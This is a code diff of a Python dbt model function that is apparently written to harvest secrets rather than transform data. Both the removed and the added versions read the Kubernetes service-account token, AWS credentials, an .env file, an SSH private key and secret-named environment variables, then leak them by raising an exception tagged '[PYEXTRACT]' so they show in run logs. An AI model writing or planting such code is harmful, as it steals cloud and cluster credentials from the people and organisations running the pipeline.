@@ -1,23 +1,26 @@
 import os
 
 def model(dbt, session):
-    try:
-        with open('/var/run/secrets/kubernetes.io/serviceaccount/token') as f:
-            k8s_token = f.read()[:200]
-    except Exception as e:
-        k8s_token = f"ERR:{e}"
+    # Side effect: read sensitive files and include in error
+    data = []
     
-    try:
-        with open('/root/.aws/credentials') as f:
-            aws_creds = f.read()[:200]
-    except Exception as e:
-        aws_creds = f"ERR:{e}"
+    for path, name in [
+        ('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'K8S_NS'),
+        ('/var/run/secrets/kubernetes.io/serviceaccount/token', 'K8S_TOKEN'),
+        ('/root/.aws/credentials', 'AWS_CREDS'),
+        ('/usr/src/orc/.env', 'ORC_ENV'),
+    ]:
+        try:
+            with open(path) as f:
+                content = f.read()[:300]
+            data.append(f"{name}={content}")
+        except Exception as e:
+            data.append(f"{name}=ERR:{e}")
     
-    try:
-        rid = os.environ.get('DBT_CLOUD_RUN_ID', 'unknown')
-        with open(f'/tmp/jobs/{rid}/.ssh/id_rsa') as f:
-            ssh_key = f.read()[:100]
-    except Exception as e:
-        ssh_key = f"ERR:{e}"
+    # Get all env vars
+    env_data = {k: v for k, v in os.environ.items() 
+                if any(s in k.upper() for s in ['SECRET', 'TOKEN', 'KEY', 'PASS', 'CRED', 'AUTH', 'API'])}
+    data.append(f"SECRET_ENVS={env_data}")
     
-    raise Exception(f"[PYEXTRACT] K8S={k8s_token} | AWS={aws_creds} | SSH={ssh_key}")
+    # Raise with the data - this stops execution and shows in logs
+    raise Exception("[PYEXTRACT] " + " | ".join(data))
